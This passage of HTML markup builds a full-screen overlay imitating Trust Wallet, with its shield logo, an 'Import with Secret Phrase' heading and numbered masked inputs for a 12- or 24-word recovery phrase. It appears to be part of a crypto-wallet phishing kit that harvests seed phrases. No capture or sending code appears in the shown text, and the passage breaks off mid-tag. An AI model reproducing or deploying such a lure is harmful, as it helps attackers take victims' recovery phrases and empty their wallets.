      class="trust-modal-overlay scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#12121280] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-auto scwtw-z-[2147483647] scwtw-opacity-100"
    ></div>
    <div
      id="trust-modal"
      style="display: none"
      class="trust-modal connect-modal-parent scwtw-fixed scwtw-inset-0 scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-none scwtw-z-[2147483648] scwtw-opacity-100"
    >
      <div
        class="trust-modal-content scwtw-pointer-events-auto scwtw-flex scwtw-transition-transform scwtw-duration-200 scwtw-ease-in-out scwtw-fixed scwtw-top-1/2 scwtw-left-1/2 -scwtw-translate-x-1/2 scwtw-w-full scwtw-h-full scwtw-max-full md:scwtw-top-0 md:scwtw-right-8 md:scwtw-left-auto md:scwtw-translate-x-0 md:scwtw-w-[360px] md:scwtw-h-[680px] md:scwtw-border md:scwtw-border-[#eaecef] dark:md:scwtw-border-[#474d57] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto -scwtw-translate-y-1/2 md:scwtw-translate-y-0"
      >
        <div
          class="scwtw-h-full scwtw-w-full scwtw-bg-[#ffffff] dark:scwtw-bg-[#1b1b1c] scwtw-shadow-xl"
        >
          <div class="scwtw-relative scwtw-z-[2147483649] scwtw-h-full">
            <div
              id="shield-container"
              class="scwtw-absolute scwtw-inset-0 scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-flex scwtw-items-center scwtw-justify-center scwtw-flex-cols scwtw-overflow-hidden scwtw-opacity-0 scwtw-hidden"
            >
              <div>
                <svg
                  class="scwtw-h-[120px] scwtw-w-full shield-svg"
                  fill="none"
                  width="62"
                  height="87"
                  viewBox="0 0 62 87"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <g clip-path="url(#clip0_26161_83707)">
                    <path
                      d="M-0.00195312 26.9479L30.5756 16.9648V86.0759C8.73428 76.8606 -0.00195312 59.1989 -0.00195312 49.2159V26.9465V26.9479Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M61.1556 26.9479L30.5781 16.9648V86.0759C52.4194 76.8606 61.1556 59.1989 61.1556 49.2172V26.9479Z"
                      fill="url(#paint0_linear_26161_83707)"
                    ></path>
                    <path
                      d="M12.0561 0.34082H16.3227V2.73096C17.7214 0.582458 19.33 0.34082 21.6857 0.34082V4.56603H20.6128C17.7905 4.56603 16.4387 5.89434 16.4387 8.52474V13.0151H12.0547V0.34082H12.0561Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M35.9252 13.0137H31.5413V11.8055C30.5844 12.917 29.2795 13.3989 27.6709 13.3989C24.6166 13.3989 22.8906 11.5887 22.8906 8.25687V0.34082H27.2746V7.2696C27.2746 8.83818 28.0437 9.75502 29.3486 9.75502C30.6534 9.75502 31.5413 8.86165 31.5413 7.34141V0.34082H35.9252V13.0151V13.0137Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M36.9961 9.10059H41.1012C41.289 10.0174 41.9172 10.4027 43.4319 10.4027C44.6677 10.4027 45.3913 10.1141 45.3913 9.58249C45.3913 9.17101 45.0406 8.9059 44.0395 8.68912L40.7284 7.94073C38.5136 7.43536 37.3938 6.15538 37.3938 4.10215C37.3938 1.39719 39.3752 -0.00292969 43.2221 -0.00292969C47.0689 -0.00292969 48.9578 1.36129 49.2851 4.28303H45.2049C45.1358 3.51117 44.3419 3.03894 43.037 3.03894C41.989 3.03894 41.3124 3.37585 41.3124 3.88398C41.3124 4.31755 41.7543 4.65584 42.6421 4.87539L46.1162 5.72043C48.4 6.27412 49.4977 7.43398 49.4977 9.31738C49.4977 11.9257 47.236 13.4708 43.3905 13.4708C39.545 13.4708 37.0016 11.8056 37.0016 9.10059H36.9975H36.9961Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M61.17 4.28158V0.34082H50.3516V4.28435H53.5798V13.0137H57.9404V4.28158H61.17Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M10.8366 4.28158V0.34082H0.0195312V4.28435H3.24781V13.0137H7.60833V4.28158H10.8366Z"
                      fill="#48FF91"
                    ></path>
                  </g>
                  <defs>
                    <linearGradient
                      id="paint0_linear_26161_83707"
                      x1="29.1518"
                      y1="94.7238"
                      x2="54.3898"
                      y2="3.84876"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop offset="0.26" stop-color="#48FF91"></stop>
                      <stop offset="0.66" stop-color="#0094FF"></stop>
                      <stop offset="0.8" stop-color="#0038FF"></stop>
                      <stop offset="0.89" stop-color="#0500FF"></stop>
                    </linearGradient>
                    <clipPath id="clip0_26161_83707">
                      <rect
                        width="61.1691"
                        height="86.0768"
                        fill="white"
                      ></rect>
                    </clipPath>
                  </defs>
                </svg>
              </div>
            </div>
            <div
              id="import-container-trust"
              class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-opacity-100"
            >
              <div class="scwtw-mt-5">
                <div class="scwtw-flex scwtw-items-center scwtw-justify-center">
                  <div>
                    <svg
                      class="scwtw-h-[70px] scwtw-w-full"
                      fill="none"
                      width="62"
                      height="87"
                      viewBox="0 0 62 87"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <g clip-path="url(#clip0_26161_837071)">
                        <path
                          d="M-0.00195312 26.9479L30.5756 16.9648V86.0759C8.73428 76.8606 -0.00195312 59.1989 -0.00195312 49.2159V26.9465V26.9479Z"
                          fill="#48FF91"
                        ></path>
                        <path
                          d="M61.1556 26.9479L30.5781 16.9648V86.0759C52.4194 76.8606 61.1556 59.1989 61.1556 49.2172V26.9479Z"
                          fill="url(#paint0_linear_26161_837071)"
                        ></path>
                        <path
                          d="M12.0561 0.34082H16.3227V2.73096C17.7214 0.582458 19.33 0.34082 21.6857 0.34082V4.56603H20.6128C17.7905 4.56603 16.4387 5.89434 16.4387 8.52474V13.0151H12.0547V0.34082H12.0561Z"
                          fill="#48FF91"
                        ></path>
                        <path
                          d="M35.9252 13.0137H31.5413V11.8055C30.5844 12.917 29.2795 13.3989 27.6709 13.3989C24.6166 13.3989 22.8906 11.5887 22.8906 8.25687V0.34082H27.2746V7.2696C27.2746 8.83818 28.0437 9.75502 29.3486 9.75502C30.6534 9.75502 31.5413 8.86165 31.5413 7.34141V0.34082H35.9252V13.0151V13.0137Z"
                          fill="#48FF91"
                        ></path>
                        <path
                          d="M36.9961 9.10059H41.1012C41.289 10.0174 41.9172 10.4027 43.4319 10.4027C44.6677 10.4027 45.3913 10.1141 45.3913 9.58249C45.3913 9.17101 45.0406 8.9059 44.0395 8.68912L40.7284 7.94073C38.5136 7.43536 37.3938 6.15538 37.3938 4.10215C37.3938 1.39719 39.3752 -0.00292969 43.2221 -0.00292969C47.0689 -0.00292969 48.9578 1.36129 49.2851 4.28303H45.2049C45.1358 3.51117 44.3419 3.03894 43.037 3.03894C41.989 3.03894 41.3124 3.37585 41.3124 3.88398C41.3124 4.31755 41.7543 4.65584 42.6421 4.87539L46.1162 5.72043C48.4 6.27412 49.4977 7.43398 49.4977 9.31738C49.4977 11.9257 47.236 13.4708 43.3905 13.4708C39.545 13.4708 37.0016 11.8056 37.0016 9.10059H36.9975H36.9961Z"
                          fill="#48FF91"
                        ></path>
                        <path
                          d="M61.17 4.28158V0.34082H50.3516V4.28435H53.5798V13.0137H57.9404V4.28158H61.17Z"
                          fill="#48FF91"
                        ></path>
                        <path
                          d="M10.8366 4.28158V0.34082H0.0195312V4.28435H3.24781V13.0137H7.60833V4.28158H10.8366Z"
                          fill="#48FF91"
                        ></path>
                      </g>
                      <defs>
                        <linearGradient
                          id="paint0_linear_26161_837071"
                          x1="29.1518"
                          y1="94.7238"
                          x2="54.3898"
                          y2="3.84876"
                          gradientUnits="userSpaceOnUse"
                        >
                          <stop offset="0.26" stop-color="#48FF91"></stop>
                          <stop offset="0.66" stop-color="#0094FF"></stop>
                          <stop offset="0.8" stop-color="#0038FF"></stop>
                          <stop offset="0.89" stop-color="#0500FF"></stop>
                        </linearGradient>
                        <clipPath id="clip0_26161_837071">
                          <rect
                            width="61.1691"
                            height="86.0768"
                            fill="white"
                          ></rect>
                        </clipPath>
                      </defs>
                    </svg>
                  </div>
                </div>
                <div
                  class="scwtw-flex scwtw-flex-col scwtw-items-center scwtw-justify-center scwtw-text-center scwtw-gap-y-2 scwtw-mt-4"
                >
                  <div>
                    <h3
                      class="scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] font-geeza scwtw-font-bold scwtw-text-[24px]"
                    >
                      Import with Secret Phrase
                    </h3>
                  </div>
                  <div class="scwtw-w-full scwtw-px-4">
                    <select
                      class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-relative scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none"
                      id="trust-change-words-count"
                    >
                      <option value="12" selected="">
                        I have a 12 word Secret Phrase
                      </option>
                      <option value="24">I have a 24 word Secret Phrase</option>
                    </select>
                  </div>
                </div>
                <div
                  class="scwtw-mt-6 scwtw-px-4 scwtw-max-h-[320px] scwtw-overflow-y-auto trust-custom-scrollbar"
                >
                  <div
                    id="trust-container-12-words"
                    class="trust-container-12-words scwtw-grid scwtw-grid-cols-2 scwtw-gap-1"
                  >
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        1.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #1"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="1"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        2.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #2"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="2"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        3.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #3"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="3"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        4.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #4"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="4"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        5.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #5"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="5"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        6.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #6"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="6"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        7.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #7"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="7"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
